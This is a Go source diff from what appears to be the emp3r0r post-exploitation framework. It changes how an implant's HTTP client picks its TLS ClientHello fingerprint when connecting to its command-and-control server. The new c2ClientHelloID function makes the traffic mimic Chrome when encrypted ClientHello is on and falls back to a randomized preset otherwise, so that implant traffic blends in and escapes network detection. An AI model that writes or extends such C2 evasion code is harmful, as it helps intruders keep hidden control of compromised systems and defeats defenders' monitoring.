@@ -53,7 +53,7 @@ func CreateEmp3r0rHTTPClient(c2_addr, proxyServer string) *http.Client {
 	logging.Infof("CA cert fingerprint: %s, now making proxy dialer", sha256SumRaw(ca_crt.Raw))
 
 	// set proxyURL to nil to use direct connection for C2 transport
-	proxyDialer, _ := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
+	proxyDialer, _ := makeProxyDialer(nil, config, c2ClientHelloID())
 	if proxyServer != "" {
 		logging.Infof("Using proxy server: %s", proxyServer)
 		// use a proxy for our HTTP client
@@ -62,7 +62,7 @@ func CreateEmp3r0rHTTPClient(c2_addr, proxyServer string) *http.Client {
 			logging.Fatalf("Invalid proxy: %v", e)
 		}
 
-		proxyDialer, _ = makeProxyDialer(proxyUrl, config, clientHelloIDMap["hellorandomizedalpn"])
+		proxyDialer, _ = makeProxyDialer(proxyUrl, config, c2ClientHelloID())
 	}
 
 	// For plain HTTP, we do not need TLS camouflage or uTLS probes.
@@ -80,7 +80,7 @@ func CreateEmp3r0rHTTPClient(c2_addr, proxyServer string) *http.Client {
 	try := 0
 init_transport:
 	logging.Infof("Initializing transport (%s)...", c2url)
-	tr, err := makeTransport(c2url, clientHelloIDMap["hellorandomizedalpn"], config, proxyDialer)
+	tr, err := makeTransport(c2url, c2ClientHelloID(), config, proxyDialer)
 	try++
 	if err != nil {
 		if proxyServer != "" && try < 5 {
@@ -95,6 +95,17 @@ init_transport:
 
 	logging.Infof("Transport initialized (%s)", c2url)
 	return &http.Client{Transport: tr}
+}
+
+// c2ClientHelloID picks the ClientHello preset for the C2 TLS connection. ECH
+// is only compatible with uTLS's browser parrots: the randomized presets build
+// an inner/outer ClientHello pair that uTLS rejects as a malformed outer Client
+// Hello. With ECH enabled, mirror a real browser (Chrome also sends ECH GREASE).
+func c2ClientHelloID() *utls.ClientHelloID {
+	if ECHEnabled() {
+		return clientHelloIDMap["hellochrome_auto"]
+	}
+	return clientHelloIDMap["hellorandomizedalpn"]
 }
 
 // CreatePreflightHTTPClient creates a lightweight HTTP client for preflight checks
